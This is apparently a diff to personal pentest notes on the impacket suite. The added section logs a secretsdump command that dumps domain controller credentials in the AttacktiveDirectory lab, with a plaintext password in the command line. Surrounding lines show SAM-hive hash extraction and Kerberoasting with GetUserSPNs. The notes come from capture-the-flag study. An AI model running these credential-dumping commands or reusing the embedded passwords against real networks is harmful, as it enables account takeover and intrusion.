@@ -1,4 +1,4 @@
-# impacket
+﻿# impacket
 
 ## Wreath Commands
 
@@ -6,6 +6,12 @@
 impacket-secretsdump -sam sam.bak -system system.bak LOCAL
 ```
 Used on: **Wreath** - extracted local NTLM hashes from saved SAM/SYSTEM hives.
+
+### Dump credentials from DC
+```bash
+impacket-secretsdump spookysec.local/backup:'backup2517860'@$TARGET
+```
+Used on: **AttacktiveDirectory**
 
 Python suite implementing Windows/AD network protocols (SMB, Kerberos, MSSQL, WMI, DCERPC). Used for interactive MSSQL sessions, AS-REP roasting and Kerberoasting.
 
@@ -39,5 +45,6 @@ impacket-GetUserSPNs overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv' -dc-ip TARGET_IP -req
 Used on: **Overwatch**
 
 - `-request` — request TGS tickets and dump them in crackable format (mode 13100)
+
 
 
